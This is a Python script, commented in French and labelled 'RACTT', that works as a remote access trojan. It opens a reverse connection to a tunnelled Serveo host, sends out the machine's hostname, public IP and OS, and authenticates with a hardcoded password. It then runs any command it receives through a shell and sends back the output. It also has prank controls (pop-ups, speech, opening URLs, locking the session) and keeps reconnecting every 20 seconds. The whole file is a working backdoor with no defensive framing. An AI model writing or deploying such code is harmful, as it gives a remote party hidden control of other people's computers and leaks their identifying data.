import socket
import subprocess
import os
import time
import platform
import urllib.request

# --- CONFIGURATION ---
URL_PUBLIQUE = "103fa379dfd22edd-93-23-16-243.serveousercontent.com"
PORT_PUBLIQUE = 80 # Le port 80 est le standard utilisé par Serveo vers l'extérieur

def executer_commande(cmd):
    try:
        # Commandes spéciales RACTT
        if cmd.startswith("popup:"):
            msg = cmd.split(":", 1)[1]
            subprocess.Popen(["notify-send", "RACTT", msg])
            return "Notification affichée."
        
        elif cmd.startswith("speak:"):
            msg = cmd.split(":", 1)[1]
            subprocess.Popen(["espeak", "-v", "fr", msg])
            return "Synthèse vocale lancée."
            
        elif cmd.startswith("browser:"):
            url = cmd.split(":", 1)[1]
            subprocess.Popen(["xdg-open", url])
            return f"Navigation vers {url}"

        elif cmd == "lock":
            subprocess.Popen(["loginctl", "lock-session"])
            return "Session verrouillée."

        elif cmd == "battery":
            out = subprocess.check_output("upower -i $(upower -e | grep 'BAT') | grep percentage", shell=True)
            return out.decode().strip()

        # Commandes Shell Standard
        else:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return f"Erreur : {str(e)}"

def connecter():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((URL_PUBLIQUE, PORT_PUBLIQUE))

            # Envoi des infos (IP et OS)
            ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            infos = f"Machine : {socket.gethostname()} | IP : {ip} | OS : {platform.system()}"
            s.send(infos.encode())

            # Auth
            if s.recv(1024).decode() == "AUTH_REQUIRED":
                s.send(b"1234")
                
            if s.recv(1024).decode() == "AUTH_SUCCESS":
                while True:
                    data = s.recv(4096).decode()
                    if not data or data == "exit": break
                    reponse = executer_commande(data)
                    s.send(reponse.encode() if reponse else b"OK")
        except:
            time.sleep(20) # Attente avant reconnexion
            continue
        finally:
            s.close()

if __name__ == "__main__":
    connecter()
